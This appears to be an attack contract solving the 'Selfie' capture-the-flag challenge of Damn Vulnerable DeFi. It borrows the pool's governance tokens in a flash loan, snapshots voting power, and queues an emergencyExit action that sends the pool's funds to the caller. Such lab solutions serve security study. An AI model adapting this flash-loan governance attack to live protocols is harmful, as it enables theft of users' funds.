// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolReceiver is IERC3156FlashBorrower{
    DamnValuableTokenSnapshot snapshotToken;
    SelfiePool pool;
    SimpleGovernance gov;
    uint256 public actionId;
    
    constructor (
        DamnValuableTokenSnapshot _snapshotToken, 
        SelfiePool _pool,
        SimpleGovernance _gov   
    ) {
        snapshotToken = DamnValuableTokenSnapshot(_snapshotToken);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        snapshotToken.snapshot();
        actionId = gov.queueAction(address(pool), 0, data);
        snapshotToken.approve(address(pool), snapshotToken.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

    function borrow() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            msg.sender
            );
        pool.flashLoan(
            IERC3156FlashBorrower(this),
            address(snapshotToken),
            snapshotToken.balanceOf(address(pool)),
            data
        );
    }
   
}
